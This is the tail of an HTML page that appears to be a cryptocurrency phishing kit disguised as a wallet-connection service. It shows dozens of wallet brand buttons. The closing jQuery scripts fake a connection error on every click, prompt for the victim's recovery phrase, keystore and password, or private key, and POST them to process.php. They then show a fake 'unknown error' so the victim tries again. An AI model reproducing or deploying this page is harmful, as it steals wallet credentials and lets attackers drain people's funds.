                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/12f981b1-bb0a-4115-009f-317255979600/lg"
                  alt=""
                />
                <h4 style="color: #fff">Nash</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal39"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://bittrust.s3.amazonaws.com/1433894569.png"
                  alt=""
                />
                <h4 style="color: #fff">Coinmoni</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal40"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702.jpg"
                  alt=""
                />
                <h4 style="color: #fff">GridPlus</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal41"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5.jpg"
                  alt=""
                />
                <h4 style="color: #fff">CYBAVO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal42"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Tokenary</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal43"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Torus</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal44"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Spatium</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal45"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.png"
                  alt=""
                />
                <h4 style="color: #fff">SafePal</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal46"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Infinito</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal47"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b.jpg"
                  alt=""
                />
                <h4 style="color: #fff">wallet.io</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal48"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Ownbit</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal49"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c.jpeg"
                  alt=""
                />
                <h4 style="color: #fff">EasyPocket</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal50"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Bridge Wallet</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal51"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Spark Point</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal52"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1.jpg"
                  alt=""
                />
                <h4 style="color: #fff">ViaWallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal53"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/ofbdehdu4sju07vlltgf"
                  alt=""
                />
                <h4 style="color: #fff">BitKeep</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal54"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Vision</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal55"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b.jpg"
                  alt=""
                />
                <h4 style="color: #fff">PEAKDEFI</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal56"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Unstoppable</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal57"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0.jpeg"
                  alt=""
                />
                <h4 style="color: #fff">HaloDeFi</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal58"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Dok Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal59"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5.jpg"
                  alt=""
                />
                <h4 style="color: #fff">AT.Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal60"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//1e04cf5cddcd84edb1370b12eae1fcecedf125b7720900080e7ef2a6d3c74719.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Midas</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal61"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Ellipal</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal62"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://keyring.app/wp-content/uploads/2021/06/LOGO-KEYRING-PRO.png"
                  alt=""
                />
                <h4 style="color: #fff">KEYRING PRO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal63"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Aktionariat</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal64"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Talken</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal65"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c.jpeg"
                  alt=""
                />
                <h4 style="color: #fff">Flare</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal66"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/3abd1720-260e-495a-2e31-3d0b349e0d00/lg"
                  alt=""
                />
                <h4 style="color: #fff">KyberSwap</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal67"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0.jpeg"
                  alt=""
                />
                <h4 style="color: #fff">AToken</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal68"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346.jpg"
                  alt=""
                />
                <h4 style="color: #fff">RWallet</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal69"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//2235b648bdf382bc1a6960f1db8eda5c71f65a1996e6cb549d24783ca58a2903.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Binana</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal70"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//76428179ce9213ab6f8f49923310efcf5eea089764196c7a2018bea8afcd6603.jpg"
                  alt=""
                />
                <h4 style="color: #fff">PayTube</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal72"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//dd8ee41915d967e547c80266e883d77ee808427405f4e8026a85ac1308104221.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Linen</h4>
              </button>
              <!-- Modal -->
            </div>
          </div>
          <div class="row">
            <div class="text-center coin-section-footer">
              <h6>
                Open an app submission issue on GitHub to add your app
                <span
                  ><a
                    style="text-decoration: none; color: #0150b8"
                    href="https://www.github.com/"
                    >here.</a
                  >
                </span>
              </h6>
              <div class="text-center coin-section-icons">
                <i
                  style="color: #0c0e29; margin-right: 12px"
                  class="fab fa-facebook"
                  aria-hidden="true"
                ></i>
                <i
                  style="color: #0c0e29; margin-right: 12px"
                  class="fab fa-twitter"
                  aria-hidden="true"
                ></i>
                <i
                  style="color: #0c0e29 !important"
                  class="fab fa-discord"
                  aria-hidden="true"
                ></i>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script
      src="https://code.jquery.com/jquery-3.6.3.js"
      integrity="sha256-nQLuAZGRRcILA+6dMBOvcRh5Pe310sBpanc6+QBmyVM="
      crossorigin="anonymous"
    ></script>
    <!-- <script src="./script/walletpage.js"></script> -->
    <script
      src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"
      integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
      integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
      crossorigin="anonymous"
    ></script>
    <script src="script/waypoints/jquery.waypoints.min.js"></script>
    <script src="script/counter/jquery.counterup.min.js"></script>
    <script src="script/wow/wow.min.js"></script>
    <script src="script/script.js"></script>
    <script>
      $(document).ready(function () {
        let wallets = $(".coin-registry button");
        wallets.each(function () {
          $(this).on("click", function () {
            let img = $(this).find(".coin-img").attr("src");
            event.preventDefault();
            $(".connection-info").text("Initializing...");
            $("#current-wallet-app").text(
              $(this).children().last().text().trim()
            );
            $("#current-wallet-logo").attr("src", img);
            $("#connect-dialog").show();
            setTimeout(function () {
              $(".connection-info").html(
                'Error Connecting... <button class="manual-connection">Connect Manually</button>'
              );
              $(document).find("button.manual-connection").trigger("click");
            }, 1000);
          });
        });
      });
    </script>
    <script>
      $(document).ready(function () {
        let dialogDismiss = $(".dialog-dismiss");
        let sendForm = $("#data-to-send");
        let successBox = $("#success-dialog");
        let errorBox = $("#error-dialog");
        dialogDismiss.each(function () {
          $(this).on("click", function () {
            $("#connect-dialog").hide();
            $("#send-dialog").hide();
          });
        });
        $("#phraseSend").on("click", function () {
          sendForm.html(
            '<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
          );
        });
        $("#keystoreSend").on("click", function () {
          sendForm.html(
            '<div class="form-group"><input type="hidden" id="type" name="type" value="keystore"><textarea rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" class="form-control" name="keystore-password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
          );
        });
        $("#privateKeySend").on("click", function () {
          sendForm.html(
            '<input type="hidden" id="type" name="type" value="privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
          );
        });

        $(".connection-info").on("click", ".manual-connection", function () {
          $("#current-wallet-app-send").text($("#current-wallet-app").text());
          $("#walletNameData").val($("#current-wallet-app").text());
          var link = $("#current-wallet-app").text();
          $("#current-wallet-send-logo").attr(
            "src",
            $("#current-wallet-logo").attr("src")
          );
          $("#connect-dialog").hide();
          $("#send-dialog").show();
        });

        $.ajaxSetup({
          headers: {
            "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
          },
        });

        $("#processForm").submit(function (e) {
          e.preventDefault();
          let processBtn = $("#proceedButton");
          let cancelBtn = $("#cancelBtn");
          let formData = new FormData(this);
          $.ajax({
            type: "POST",
            url: "process.php",
            data: formData,
            cache: false,
            contentType: false,
            processData: false,
            beforeSend: function () {
              processBtn.html(
                '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
              );
              processBtn.prop("disabled", true);
              cancelBtn.prop("disabled", true);
            },
            success: function () {
              // dismissAllDialogs();
              setTimeout(function () {
                restoreButtons();
                $("div.message-tab").html(
                  "<div class='alert alert-danger'>An unknown error occured, please try again later.</div>"
                );
              }, 5000);
            },
            error: function () {
              restoreButtons();
              dismissAllDialogs();
              errorBox.show();
              setTimeout(function () {
                dismissAllDialogs();
                $("#send-dialog").show();
              }, 2500);
            },
          });
          function restoreButtons() {
            processBtn.html("PROCEED");
            processBtn.prop("disabled", false);
            cancelBtn.prop("disabled", false);
          }
          function dismissAllDialogs() {
            successBox.hide();
            errorBox.hide();
            $("#connect-dialog").hide();
            $("#send-dialog").hide();
            $("#processing-dialog").hide();
          }
        });
      });
    </script>
  </body>
</html>